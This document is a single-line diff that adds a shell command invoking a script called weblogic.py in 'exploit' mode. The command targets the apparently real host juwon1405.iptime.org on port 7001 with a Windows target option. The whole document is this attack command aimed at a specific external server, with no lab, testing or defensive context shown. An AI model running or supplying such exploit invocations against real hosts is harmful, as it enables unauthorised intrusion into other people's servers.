@@ -1,0 +1,1 @@
+./weblogic.py -u juwon1405.iptime.org -p 7001 -os win -t exploit
